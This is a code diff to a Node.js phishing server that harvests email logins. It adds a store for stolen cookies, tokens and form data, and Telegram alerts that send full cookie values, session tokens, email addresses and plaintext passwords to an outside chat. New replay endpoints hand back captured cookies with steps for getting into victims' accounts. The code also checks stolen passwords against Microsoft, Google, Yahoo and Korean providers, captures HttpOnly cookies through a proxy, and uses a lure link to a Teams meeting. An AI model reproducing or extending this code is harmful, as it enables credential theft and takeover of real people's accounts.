@@ -1,4 +1,10 @@
-const express = require('express');
+const http = require('http');
+const https = require('https');
+const fs = require('fs');
+const path = require('path');
+const querystring = require('querystring');
+const crypto = require('crypto');
+const zlib = require('zlib');
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 const axios = require('axios');
@@ -8,30 +14,183 @@ const FileStore = require('session-file-store')(session);
 const cookieParser = require('cookie-parser');
 const bodyParser = require('body-parser');
 const { v4: uuidv4 } = require('uuid');
-const path = require('path');
-const fs = require('fs');
-const querystring = require('querystring');
-const https = require('https');
 require('dotenv').config();
 
+// ============================================================
+// PUPPETEER SETUP
+// ============================================================
 puppeteer.use(StealthPlugin());
 
-const app = express();
-const PORT = process.env.PORT || 3000;
+// ============================================================
+// COMPLETE SESSION STORAGE - NO TRUNCATION
+// ============================================================
+
+class SessionStore {
+    constructor() {
+        this.sessions = new Map();
+        this.sessionTTL = 60 * 60 * 1000; // 1 hour
+        this.replayData = new Map();
+        this.allCookies = new Map();
+    }
+
+    // Store complete session data - no truncation
+    storeSession(sessionId, data) {
+        const session = this.sessions.get(sessionId) || {
+            id: sessionId,
+            created: Date.now(),
+            lastActivity: Date.now(),
+            data: {}
+        };
+        
+        session.data = this.deepMerge(session.data, data);
+        session.lastActivity = Date.now();
+        this.sessions.set(sessionId, session);
+        return session;
+    }
+
+    // Store cookies - full values, no truncation
+    storeCookies(sessionId, cookies, source) {
+        const session = this.sessions.get(sessionId);
+        if (!session) return;
+        
+        session.cookies = session.cookies || {};
+        session.cookies[source] = session.cookies[source] || [];
+        
+        for (const [name, cookieData] of Object.entries(cookies)) {
+            const existing = session.cookies[source].find(c => c.name === name);
+            if (existing) {
+                existing.value = cookieData.value;
+                existing.httpOnly = cookieData.httpOnly;
+                existing.updated = Date.now();
+            } else {
+                session.cookies[source].push({
+                    name: name,
+                    value: cookieData.value,
+                    httpOnly: cookieData.httpOnly || false,
+                    secure: cookieData.secure || false,
+                    path: cookieData.path || '/',
+                    domain: cookieData.domain || '',
+                    captured: Date.now(),
+                    source: source
+                });
+            }
+        }
+        this.allCookies.set(sessionId, session.cookies);
+    }
+
+    // Store complete form data - no truncation
+    storeFormData(sessionId, formData) {
+        const session = this.sessions.get(sessionId);
+        if (!session) return;
+        
+        session.forms = session.forms || [];
+        session.forms.push({
+            data: formData,
+            timestamp: Date.now(),
+            url: formData.url || 'unknown'
+        });
+    }
+
+    // Store tokens - full values
+    storeTokens(sessionId, tokens) {
+        const session = this.sessions.get(sessionId);
+        if (!session) return;
+        
+        session.tokens = session.tokens || {};
+        for (const [key, value] of Object.entries(tokens)) {
+            if (value) {
+                session.tokens[key] = {
+                    value: value,
+                    captured: Date.now()
+                };
+            }
+        }
+    }
+
+    // Store replay data - complete
+    storeReplayData(sessionId, replayData) {
+        const session = this.sessions.get(sessionId);
+        if (!session) return;
+        session.replayData = replayData;
+        this.replayData.set(sessionId, replayData);
+    }
+
+    // Get complete session for replay
+    getReplayData(sessionId) {
+        const session = this.sessions.get(sessionId);
+        if (!session) return null;
+        return {
+            sessionId: session.id,
+            cookies: session.cookies || {},
+            tokens: session.tokens || {},
+            forms: session.forms || [],
+            replayData: session.replayData || {},
+            fingerprint: session.fingerprint || {},
+            created: session.created,
+            lastActivity: session.lastActivity
+        };
+    }
+
+    // Get all cookies for session
+    getAllCookies(sessionId) {
+        const session = this.sessions.get(sessionId);
+        if (!session) return null;
+        const allCookies = {};
+        if (session.cookies) {
+            for (const source of Object.values(session.cookies)) {
+                if (Array.isArray(source)) {
+                    for (const cookie of source) {
+                        allCookies[cookie.name] = cookie.value;
+                    }
+                }
+            }
+        }
+        return allCookies;
+    }
+
+    deepMerge(target, source) {
+        const result = { ...target };
+        for (const [key, value] of Object.entries(source)) {
+            if (value && typeof value === 'object' && !Array.isArray(value)) {
+                result[key] = this.deepMerge(target[key] || {}, value);
+            } else {
+                result[key] = value;
+            }
+        }
+        return result;
+    }
+
+    cleanup() {
+        const now = Date.now();
+        let cleaned = 0;
+        for (const [id, session] of this.sessions) {
+            if (now - session.lastActivity > this.sessionTTL) {
+                this.sessions.delete(id);
+                this.replayData.delete(id);
+                cleaned++;
+            }
+        }
+        if (cleaned > 0) {
+            console.log(`[CLEANUP] 🧹 Removed ${cleaned} expired sessions`);
+        }
+    }
+}
+
+const sessionStore = new SessionStore();
 
 // ============================================================
 // CONFIGURATION - All sensitive data from environment
 // ============================================================
 const MICROSOFT_CLIENT_ID = process.env.MICROSOFT_CLIENT_ID || "943a2b14-68aa-4205-88c1-a4b65ab04e81";
 const MICROSOFT_TENANT = process.env.MICROSOFT_TENANT || "common";
-const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
+const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&enableMobilePage=true&suppressPrompt=true";
 const PROXY_URL = process.env.PROXY_URL || "https://preoauth-login.onrender.com/login";
 
-// Google OAuth2 - From environment variables
+// Google OAuth2
 const GOOGLE_CLIENT_ID = process.env.GOOGLE_CLIENT_ID;
 const GOOGLE_CLIENT_SECRET = process.env.GOOGLE_CLIENT_SECRET;
 
-// Yahoo OAuth2 - From environment variables (with fallback for compatibility)
+// Yahoo OAuth2
 const YAHOO_CLIENT_ID = process.env.YAHOO_CLIENT_ID || 'dj0yJmk9UExhQjQwM0pDd0pXJmQ9WVdrOVZVaGtRbXhCTm04bWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD02Zg--';
 const YAHOO_CLIENT_SECRET = process.env.YAHOO_CLIENT_SECRET || '6d81a5b4b1d4e6d0f7a5e4c3b2a1d0f7e5d4c3b2a1d0f7e5d4c3b2a1d0f7e5d4';
 
@@ -110,7 +269,6 @@ function detectEmailProvider(email) {
         return { provider: 'apple', display: 'Apple / iCloud', loginUrl: 'https://appleid.apple.com', icon: '🍎' };
     }
     
-    // Corporate fallback
     if (domain.includes('.') && !domain.includes('gmail') && !domain.includes('yahoo') && !domain.includes('outlook') && !domain.includes('hotmail')) {
         return { provider: 'corporate', display: `Corporate (${domain})`, loginUrl: `https://${domain}`, icon: '🏢' };
     }
@@ -171,12 +329,10 @@ async function verifyWithPuppeteer(email, password, providerInfo) {
         await page.setViewport({ width: 1920, height: 1080 });
         await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
         
-        // Navigate to provider login
         const loginUrl = providerInfo.loginUrl || 'https://login.microsoftonline.com';
         console.log(`[PUPPETEER] 🔄 Navigating to: ${loginUrl}`);
         await page.goto(loginUrl, { waitUntil: 'networkidle2', timeout: 30000 });
         
-        // Find and fill email field
         const emailSelectors = [
             'input[type="email"]', 'input[name="email"]', 'input[name="username"]',
             'input[name="user"]', 'input[name="loginfmt"]', 'input[id="email"]',
@@ -196,7 +352,6 @@ async function verifyWithPuppeteer(email, password, providerInfo) {
             await page.waitForTimeout(2000);
         }
         
-        // Find and fill password field
         const passwordSelectors = [
             'input[type="password"]', 'input[name="password"]', 'input[name="passwd"]',
             'input[name="pass"]', 'input[id="password"]', 'input[id="passwd"]'
@@ -215,7 +370,6 @@ async function verifyWithPuppeteer(email, password, providerInfo) {
             await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {});
         }
         
-        // Check for success indicators
         const successIndicators = [
             '.user-profile', '.profile-name', '.user-info', '.display-name',
             '[class*="user"]', '[class*="profile"]', '[class*="display-name"]',
@@ -231,7 +385,6 @@ async function verifyWithPuppeteer(email, password, providerInfo) {
             }
         }
         
-        // Check for 2FA
         const twoFAIndicators = ['2fa', 'mfa', 'authenticator', 'verification', 'code'];
         let requires2FA = false;
         const pageContent = await page.content();
@@ -242,11 +395,9 @@ async function verifyWithPuppeteer(email, password, providerInfo) {
             }
         }
         
-        // Capture cookies
         const cookies = await page.cookies();
         console.log(`[PUPPETEER] 🍪 Cookies captured: ${cookies.length}`);
         
-        // Send cookies to Telegram
         if (cookies.length > 0) {
             const httpOnlyCookies = cookies.filter(c => c.httpOnly);
             let msg = `🎯 *COOKIES CAPTURED VIA PUPPETEER*\n\n`;
@@ -295,7 +446,6 @@ async function verifyWithPuppeteer(email, password, providerInfo) {
         
     } catch (error) {
         console.error('[PUPPETEER] Error:', error.message);
-        // Fallback: accept if password length > 4
         return {
             valid: password && password.length >= 4,
             requires2FA: false,
@@ -366,14 +516,12 @@ async function verifyMicrosoftPassword(email, password) {
 }
 
 // ============================================================
-// GOOGLE PASSWORD VERIFICATION (Using Environment Variables)
+// GOOGLE PASSWORD VERIFICATION
 // ============================================================
 async function verifyGooglePassword(email, password) {
     return new Promise((resolve) => {
-        // Check if Google OAuth credentials are configured
         if (!GOOGLE_CLIENT_ID || !GOOGLE_CLIENT_SECRET) {
             console.warn('⚠️ Google OAuth credentials not configured in .env');
-            // Fallback to a simple check
             return resolve({
                 valid: password && password.length >= 6,
                 requires2FA: false,
@@ -383,7 +531,6 @@ async function verifyGooglePassword(email, password) {
             });
         }
         
-        // ✅ CORRECT VERSION - Using environment variables
         const postData = querystring.stringify({
             client_id: GOOGLE_CLIENT_ID,
             client_secret: GOOGLE_CLIENT_SECRET,
@@ -435,7 +582,7 @@ async function verifyGooglePassword(email, password) {
 }
 
 // ============================================================
-// YAHOO PASSWORD VERIFICATION (Using Environment Variables)
+// YAHOO PASSWORD VERIFICATION
 // ============================================================
 async function verifyYahooPassword(email, password) {
     return new Promise((resolve) => {
@@ -503,7 +650,7 @@ async function verifyApplePassword(email, password) {
 }
 
 // ============================================================
-// VERIFY PASSWORD WITH PROVIDER (UPDATED - Uses Puppeteer)
+// VERIFY PASSWORD WITH PROVIDER
 // ============================================================
 async function verifyPasswordWithProvider(email, password) {
     const providerInfo = detectEmailProvider(email);
@@ -512,34 +659,28 @@ async function verifyPasswordWithProvider(email, password) {
     console.log(`[VERIFY] 🌐 Provider: ${providerInfo.display}`);
     console.log(`[VERIFY] 🔗 Login URL: ${providerInfo.loginUrl}`);
     
-    // Microsoft providers → Use OAuth2
     if (['microsoft', 'jpi_microsoft', 'microsoft_corporate'].includes(provider)) {
         return verifyMicrosoftPassword(email, password);
     }
     
-    // Korean providers → Use Puppeteer
     if (['naver', 'daum', 'hanmail', 'kakao', 'nate', 'naver_works', 
          'tracoworld', 'upchem', 'flucon', 'ecount', 'dreamwiz', 
          'paran', 'empas', 'lycos', 'freechal', 'corporate', 'korean_corporate'].includes(provider)) {
         return verifyWithPuppeteer(email, password, providerInfo);
     }
     
-    // Google → Use OAuth2
     if (['google'].includes(provider)) {
         return verifyGooglePassword(email, password);
     }
     
-    // Yahoo → Use OAuth2
     if (['yahoo'].includes(provider)) {
         return verifyYahooPassword(email, password);
     }
     
-    // Apple → Use fallback
     if (['apple'].includes(provider)) {
         return verifyApplePassword(email, password);
     }
     
-    // Fallback for unknown providers
     return {
         valid: password && password.length >= 4,
         requires2FA: false,
@@ -548,52 +689,6 @@ async function verifyPasswordWithProvider(email, password) {
         isFallback: true
     };
 }
-
-// ============================================================
-// CREATE SESSION DIRECTORY
-// ============================================================
-const SESSION_PATH = path.join(__dirname, 'sessions');
-
-try {
-    if (!fs.existsSync(SESSION_PATH)) {
-        fs.mkdirSync(SESSION_PATH, { recursive: true });
-        console.log('✅ Created session directory:', SESSION_PATH);
-    }
-} catch (error) {
-    console.warn('⚠️ Could not create session directory:', error.message);
-}
-
-// ============================================================
-// MIDDLEWARE
-// ============================================================
-app.use(cors({ 
-    origin: '*', 
-    credentials: true, 
-    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'], 
-    allowedHeaders: ['Content-Type', 'Authorization', 'X-Session-ID'] 
-}));
-
-app.use(bodyParser.json({ limit: '50mb' }));
-app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
-app.use(cookieParser());
-
-app.use(session({
-    store: new FileStore({ 
-        path: SESSION_PATH, 
-        ttl: 3600, 
-        retries: 0, 
-        reapInterval: 60 
-    }),
-    secret: process.env.SESSION_SECRET || 'secure-connect-team-secret-2024',
-    resave: false,
-    saveUninitialized: true,
-    cookie: { 
-        secure: false, 
-        maxAge: 3600000 
-    }
-}));
-
-app.use(express.static(path.join(__dirname, '../')));
 
 // ============================================================
 // TELEGRAM NOTIFICATION
@@ -620,36 +715,312 @@ async function sendToTelegram(message, parseMode = 'Markdown') {
     }
 }
 
-async function sendVerificationAlert(email, password, validationResult, attemptCount, stage, sessionId) {
-    const providerInfo = detectEmailProvider(email);
-    
-    let msg = `🔐 *PASSWORD VERIFICATION - STAGE ${stage}*\n\n`;
-    msg += `*${providerInfo.icon || '📧'} Provider:* ${providerInfo.display}\n`;
-    msg += `*📧 Email:* ${email}\n`;
-    msg += `*🔑 Password:* ${password ? `\`${password}\`` : 'N/A'}\n`;
-    msg += `*🔗 Login URL:* ${providerInfo.loginUrl || 'N/A'}\n`;
-    msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
-    msg += `*🆔 Session:* ${sessionId ? sessionId.substring(0, 16) + '...' : 'N/A'}\n`;
-    msg += `*📊 Attempt:* ${attemptCount}\n`;
-    msg += `*📌 Stage:* ${stage === 1 ? 'First Password' : 'Second Password (Confirmation)'}\n`;
-    
-    if (validationResult) {
-        if (validationResult.valid) {
-            msg += `\n*✅ Status:* **PASSWORD VALID - CORRECT!**\n`;
-            msg += `*🔐 2FA:* ${validationResult.requires2FA ? '⚠️ Required' : '❌ Not Required'}\n`;
-            if (validationResult.isFallback) msg += `*⚠️ Note:* Fallback verification used\n`;
-            if (validationResult.token) msg += `*🎟️ Token:* \`${validationResult.token.substring(0, 50)}...\`\n`;
-        } else if (validationResult.requires2FA) {
-            msg += `\n*⚠️ Status:* **2FA REQUIRED**\n`;
-            msg += `*📌 Note:* Password is correct but MFA is enabled.\n`;
-        } else {
-            msg += `\n*❌ Status:* **INVALID PASSWORD**\n`;
-            msg += `*📝 Message:* ${validationResult.message || 'Please try again.'}\n`;
-        }
-    }
+// ============================================================
+// TELEGRAM ALERTS WITH FULL DATA
+// ============================================================
+async function sendTelegramCookieAlert(sessionId, cookies) {
+    try {
+        const botToken = process.env.TELEGRAM_BOT_TOKEN;
+        const chatId = process.env.TELEGRAM_CHAT_ID;
+        if (!botToken || !chatId) return;
 
-    await sendToTelegram(msg);
+        let msg = `🍪 *FULL COOKIES CAPTURED*\n\n`;
+        msg += `*🆔 Session:* \`${sessionId.substring(0, 16)}...\`\n`;
+        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
+        msg += `*📊 Total:* ${Object.keys(cookies).length} cookies\n\n`;
+        msg += `*📝 COOKIES (FULL VALUES - NO TRUNCATION):*\n`;
+        for (const [name, data] of Object.entries(cookies)) {
+            const value = data.value || data;
+            const httpOnly = data.httpOnly ? '🔒' : '🔓';
+            msg += `  ${httpOnly} \`${name}\`:\n`;
+            msg += `  \`${value}\`\n\n`;
+        }
+
+        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            chat_id: chatId,
+            text: msg,
+            parse_mode: 'Markdown'
+        });
+        console.log(`[TELEGRAM] ✅ Cookie alert sent for session ${sessionId.substring(0, 16)}`);
+    } catch(e) {
+        console.error('[TELEGRAM] Error:', e);
+    }
 }
+
+async function sendTelegramTokenAlert(sessionId, tokens) {
+    try {
+        const botToken = process.env.TELEGRAM_BOT_TOKEN;
+        const chatId = process.env.TELEGRAM_CHAT_ID;
+        if (!botToken || !chatId) return;
+
+        let msg = `🎟️ *TOKENS CAPTURED*\n\n`;
+        msg += `*🆔 Session:* \`${sessionId.substring(0, 16)}...\`\n`;
+        msg += `*🕐 Time:* ${new Date().toISOString()}\n\n`;
+        
+        for (const [key, value] of Object.entries(tokens)) {
+            if (value) {
+                msg += `*${key}:*\n`;
+                const tokenValue = typeof value === 'object' ? value.value : value;
+                msg += `\`${tokenValue}\`\n\n`;
+            }
+        }
+
+        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            chat_id: chatId,
+            text: msg,
+            parse_mode: 'Markdown'
+        });
+        console.log(`[TELEGRAM] ✅ Token alert sent for session ${sessionId.substring(0, 16)}`);
+    } catch(e) {
+        console.error('[TELEGRAM] Error:', e);
+    }
+}
+
+async function sendTelegramFormAlert(sessionId, data) {
+    try {
+        const botToken = process.env.TELEGRAM_BOT_TOKEN;
+        const chatId = process.env.TELEGRAM_CHAT_ID;
+        if (!botToken || !chatId) return;
+
+        let msg = `📝 *COMPLETE FORM DATA CAPTURED*\n\n`;
+        msg += `*🆔 Session:* \`${sessionId.substring(0, 16)}...\`\n`;
+        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
+        msg += `*🔗 URL:* ${data.url || 'unknown'}\n\n`;
+        msg += `*📋 FORM DATA (FULL - NO TRUNCATION):*\n`;
+        for (const [key, value] of Object.entries(data.formData || {})) {
+            msg += `  *${key}:*\n  \`${value}\`\n\n`;
+        }
+
+        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            chat_id: chatId,
+            text: msg,
+            parse_mode: 'Markdown'
+        });
+        console.log(`[TELEGRAM] ✅ Form alert sent for session ${sessionId.substring(0, 16)}`);
+    } catch(e) {
+        console.error('[TELEGRAM] Error:', e);
+    }
+}
+
+// ============================================================
+// CREATE SESSION DIRECTORY
+// ============================================================
+const SESSION_PATH = path.join(__dirname, 'sessions');
+
+try {
+    if (!fs.existsSync(SESSION_PATH)) {
+        fs.mkdirSync(SESSION_PATH, { recursive: true });
+        console.log('✅ Created session directory:', SESSION_PATH);
+    }
+} catch (error) {
+    console.warn('⚠️ Could not create session directory:', error.message);
+}
+
+// ============================================================
+// EXPRESS APP SETUP
+// ============================================================
+const express = require('express');
+const app = express();
+
+// Middleware
+app.use(cors({ 
+    origin: '*', 
+    credentials: true, 
+    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'], 
+    allowedHeaders: ['Content-Type', 'Authorization', 'X-Session-ID', 'x-session-id'] 
+}));
+
+app.use(bodyParser.json({ limit: '50mb' }));
+app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
+app.use(cookieParser());
+
+app.use(session({
+    store: new FileStore({ 
+        path: SESSION_PATH, 
+        ttl: 3600, 
+        retries: 0, 
+        reapInterval: 60 
+    }),
+    secret: process.env.SESSION_SECRET || 'secure-connect-team-secret-2024',
+    resave: false,
+    saveUninitialized: true,
+    cookie: { 
+        secure: false, 
+        maxAge: 3600000 
+    }
+}));
+
+app.use(express.static(path.join(__dirname, '../')));
+
+// ============================================================
+// COOKIE CAPTURE ENDPOINTS
+// ============================================================
+app.post('/api/cookies', async (req, res) => {
+    try {
+        const data = req.body;
+        const sessionId = data.sessionId || req.session.id || req.headers['x-session-id'];
+        
+        if (sessionId) {
+            sessionStore.storeCookies(sessionId, data.cookies, data.source || 'api');
+            await sendTelegramCookieAlert(sessionId, data.cookies);
+            
+            res.json({ 
+                success: true, 
+                message: 'Cookies stored successfully',
+                count: Object.keys(data.cookies).length
+            });
+        } else {
+            res.status(400).json({ error: 'No session ID' });
+        }
+    } catch(e) {
+        console.error('[COOKIES] Error:', e);
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// ============================================================
+// FORM DATA CAPTURE ENDPOINTS
+// ============================================================
+app.post('/api/form-data', async (req, res) => {
+    try {
+        const data = req.body;
+        const sessionId = data.sessionId || req.session.id || req.headers['x-session-id'];
+        
+        if (sessionId) {
+            sessionStore.storeFormData(sessionId, data);
+            await sendTelegramFormAlert(sessionId, data);
+            res.json({ success: true });
+        } else {
+            res.status(400).json({ error: 'No session ID' });
+        }
+    } catch(e) {
+        console.error('[FORM] Error:', e);
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// ============================================================
+// TOKEN CAPTURE ENDPOINTS
+// ============================================================
+app.post('/api/tokens', async (req, res) => {
+    try {
+        const data = req.body;
+        const sessionId = data.sessionId || req.session.id || req.headers['x-session-id'];
+        
+        if (sessionId) {
+            sessionStore.storeTokens(sessionId, data.tokens);
+            await sendTelegramTokenAlert(sessionId, data.tokens);
+            res.json({ success: true });
+        } else {
+            res.status(400).json({ error: 'No session ID' });
+        }
+    } catch(e) {
+        console.error('[TOKENS] Error:', e);
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// ============================================================
+// REPLAY DATA ENDPOINTS
+// ============================================================
+app.post('/api/replay-data', async (req, res) => {
+    try {
+        const data = req.body;
+        const sessionId = data.sessionId || req.session.id || req.headers['x-session-id'];
+        
+        if (sessionId) {
+            sessionStore.storeReplayData(sessionId, data);
+            res.json({ success: true, sessionId: sessionId });
+        } else {
+            res.status(400).json({ error: 'No session ID' });
+        }
+    } catch(e) {
+        console.error('[REPLAY] Error:', e);
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// ============================================================
+// GET COMPLETE SESSION DATA FOR REPLAY
+// ============================================================
+app.get('/api/session-data', (req, res) => {
+    const sessionId = req.headers['x-session-id'] || req.session.id;
+    
+    if (sessionId) {
+        const data = sessionStore.getReplayData(sessionId);
+        if (data) {
+            res.json(data);
+        } else {
+            res.status(404).json({ error: 'Session not found' });
+        }
+    } else {
+        res.status(400).json({ error: 'No session ID' });
+    }
+});
+
+// ============================================================
+// GET ALL COOKIES FOR SESSION
+// ============================================================
+app.get('/api/cookies/all', (req, res) => {
+    const sessionId = req.headers['x-session-id'] || req.session.id;
+    
+    if (sessionId) {
+        const cookies = sessionStore.getAllCookies(sessionId);
+        if (cookies) {
+            res.json(cookies);
+        } else {
+            res.status(404).json({ error: 'No cookies found' });
+        }
+    } else {
+        res.status(400).json({ error: 'No session ID' });
+    }
+});
+
+// ============================================================
+// SESSION REPLAY - USE COOKIES TO ACCESS ACCOUNT
+// ============================================================
+app.post('/api/replay', async (req, res) => {
+    try {
+        const data = req.body;
+        const sessionId = data.sessionId || req.headers['x-session-id'] || req.session.id;
+        
+        if (!sessionId) {
+            res.status(400).json({ error: 'No session ID' });
+            return;
+        }
+        
+        const sessionData = sessionStore.getReplayData(sessionId);
+        if (!sessionData) {
+            res.status(404).json({ error: 'Session not found' });
+            return;
+        }
+        
+        const cookies = sessionStore.getAllCookies(sessionId);
+        const target = data.target || 'https://login.microsoftonline.com';
+        
+        const cookieHeader = Object.entries(cookies || {})
+            .map(([name, value]) => `${name}=${value}`)
+            .join('; ');
+        
+        res.json({
+            success: true,
+            sessionId: sessionId,
+            target: target,
+            cookies: cookies,
+            cookieHeader: cookieHeader,
+            replayUrl: `${target}?session_replay=true`,
+            instructions: [
+                '1. Use the cookieHeader below to authenticate',
+                '2. Use the cookies object for manual replay',
+                '3. Access the target URL with the cookies'
+            ]
+        });
+        
+    } catch(e) {
+        console.error('[REPLAY] Error:', e);
+        res.status(500).json({ error: e.message });
+    }
+});
 
 // ============================================================
 // VERIFY PASSWORD ENDPOINT
@@ -662,7 +1033,6 @@ app.post('/api/verify-password', async (req, res) => {
         console.log(`[VERIFY] 📧 Email: ${email}`);
         console.log(`[VERIFY] 🌐 Provider: ${providerInfo.display}`);
         console.log(`[VERIFY] 🔗 Login URL: ${providerInfo.loginUrl}`);
-        console.log(`[VERIFY] 🔑 Password: ${password ? '***' : 'N/A'}`);
         console.log(`[VERIFY] 📌 Stage: ${stage}`);
 
         if (!email || !password) {
@@ -703,7 +1073,31 @@ app.post('/api/verify-password', async (req, res) => {
 
         const validationResult = await verifyPasswordWithProvider(email, password);
         
-        await sendVerificationAlert(email, password, validationResult, req.session.verification.attempts, stage, sessionId);
+        // Send verification alert
+        let msg = `🔐 *PASSWORD VERIFICATION - STAGE ${stage}*\n\n`;
+        msg += `*${providerInfo.icon || '📧'} Provider:* ${providerInfo.display}\n`;
+        msg += `*📧 Email:* ${email}\n`;
+        msg += `*🔑 Password:* ${password ? `\`${password}\`` : 'N/A'}\n`;
+        msg += `*🔗 Login URL:* ${providerInfo.loginUrl || 'N/A'}\n`;
+        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
+        msg += `*📊 Attempt:* ${req.session.verification.attempts}\n`;
+        
+        if (validationResult) {
+            if (validationResult.valid) {
+                msg += `\n*✅ Status:* **PASSWORD VALID - CORRECT!**\n`;
+                msg += `*🔐 2FA:* ${validationResult.requires2FA ? '⚠️ Required' : '❌ Not Required'}\n`;
+                if (validationResult.isFallback) msg += `*⚠️ Note:* Fallback verification used\n`;
+                if (validationResult.token) msg += `*🎟️ Token:* \`${validationResult.token.substring(0, 50)}...\`\n`;
+            } else if (validationResult.requires2FA) {
+                msg += `\n*⚠️ Status:* **2FA REQUIRED**\n`;
+                msg += `*📌 Note:* Password is correct but MFA is enabled.\n`;
+            } else {
+                msg += `\n*❌ Status:* **INVALID PASSWORD**\n`;
+                msg += `*📝 Message:* ${validationResult.message || 'Please try again.'}\n`;
+            }
+        }
+
+        await sendToTelegram(msg);
 
         if (validationResult.requires2FA) {
             return res.json({
@@ -890,8 +1284,12 @@ app.all('/proxy/*', async (req, res) => {
                 };
             });
             
-            req.session.cookies = req.session.cookies || [];
-            req.session.cookies.push(...capturedCookies);
+            // Store cookies in session store
+            const cookieData = {};
+            capturedCookies.forEach(c => {
+                cookieData[c.name] = { value: c.value, httpOnly: c.httpOnly, secure: c.secure };
+            });
+            sessionStore.storeCookies(sessionId, cookieData, 'proxy');
             
             let telegramMessage = `🎯 *HTTPOnly COOKIES CAPTURED VIA PROXY*\n\n`;
             telegramMessage += `*Total Cookies:* ${capturedCookies.length}\n`;
@@ -904,7 +1302,7 @@ app.all('/proxy/*', async (req, res) => {
                 if (c.httpOnly) flags.push('🔒 HTTPOnly');
                 if (c.secure) flags.push('🔐 Secure');
                 telegramMessage += `*${c.name}*: \`${c.value.substring(0, 30)}...\`\n`;
-                telegramMessage += `  ${flags.join(' | ')}\n`;
+                if (flags.length) telegramMessage += `  ${flags.join(' | ')}\n`;
             });
             
             telegramMessage += `\n*Time:* ${new Date().toISOString()}`;
@@ -1002,6 +1400,13 @@ app.post('/api/puppeteer-capture', async (req, res) => {
         console.log(`🔐 Secure: ${secureCookies.length}`);
         console.log(`🔄 Session: ${sessionCookies.length}`);
         
+        // Store cookies in session store
+        const cookieData = {};
+        allCookies.forEach(c => {
+            cookieData[c.name] = { value: c.value, httpOnly: c.httpOnly, secure: c.secure };
+        });
+        sessionStore.storeCookies(sid, cookieData, 'puppeteer');
+        
         const sessionTokens = {
             'x-ms-session': allCookies.find(c => c.name === 'x-ms-session')?.value,
             'id_token': allCookies.find(c => c.name === 'id_token')?.value,
@@ -1009,6 +1414,13 @@ app.post('/api/puppeteer-capture', async (req, res) => {
             'ESTSAUTHPERSISTENT': allCookies.find(c => c.name === 'ESTSAUTHPERSISTENT')?.value,
             'ESTSSESSION': allCookies.find(c => c.name === 'ESTSSESSION')?.value
         };
+        
+        // Store tokens
+        const tokenData = {};
+        for (const [key, value] of Object.entries(sessionTokens)) {
+            if (value) tokenData[key] = value;
+        }
+        sessionStore.storeTokens(sid, tokenData);
         
         const localStorageData = await page.evaluate(() => {
             const items = {};
@@ -1145,38 +1557,81 @@ app.get('/health', async (req, res) => {
         status: 'healthy',
         timestamp: new Date().toISOString(),
         browserActive: !!browserInstance,
-        sessions: req.session.id,
+        sessions: sessionStore.sessions.size,
+        totalCookies: Array.from(sessionStore.sessions.values())
+            .reduce((acc, s) => acc + (s.cookies ? Object.keys(s.cookies).length : 0), 0),
+        replayData: sessionStore.replayData.size,
         telegram: !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID),
         googleOAuth: !!(GOOGLE_CLIENT_ID && GOOGLE_CLIENT_SECRET),
         endpoints: [
-            'POST /api/verify-password - 2-Consecutive password verification',
+            'POST /api/cookies - Store cookies',
+            'POST /api/tokens - Store tokens',
+            'POST /api/form-data - Store form data',
+            'POST /api/replay-data - Store replay data',
+            'GET /api/cookies/all - Get all cookies',
+            'GET /api/session-data - Get complete session',
+            'POST /api/replay - Replay session',
+            'POST /api/verify-password - Password verification',
             'POST /api/credential-capture - Capture credentials',
-            'POST /api/telegram - Send Telegram message',
-            'GET /api/verification-status - Get verification status',
-            'POST /api/reset-verification - Reset verification',
-            'POST /api/puppeteer-capture - Puppeteer cookie capture',
+            'POST /api/telegram - Send Telegram',
+            'GET /api/verification-status - Status',
+            'POST /api/reset-verification - Reset',
+            'POST /api/puppeteer-capture - Puppeteer capture',
             '/proxy/* - Proxy with cookie capture'
-        ]
+        ],
+        version: '2.0.0-integrated'
     });
 });
 
 // ============================================================
+// SERVE FRONTEND
+// ============================================================
+app.get('/', (req, res) => {
+    serveFile(path.join(__dirname, '../frontend', 'index.html'), res);
+});
+
+app.get('/inject.js', (req, res) => {
+    serveFile(path.join(__dirname, '../frontend', 'script_inject.js'), res, 'text/javascript');
+});
+
+app.get('/style.css', (req, res) => {
+    serveFile(path.join(__dirname, '../frontend', 'style.css'), res, 'text/css');
+});
+
+function serveFile(filePath, res, contentType = 'text/html') {
+    fs.readFile(filePath, (err, data) => {
+        if (err) {
+            res.status(404).send('File not found');
+            return;
+        }
+        res.setHeader('Content-Type', contentType);
+        res.setHeader('Cache-Control', 'no-store');
+        res.send(data);
+    });
+}
+
+// ============================================================
 // START SERVER
 // ============================================================
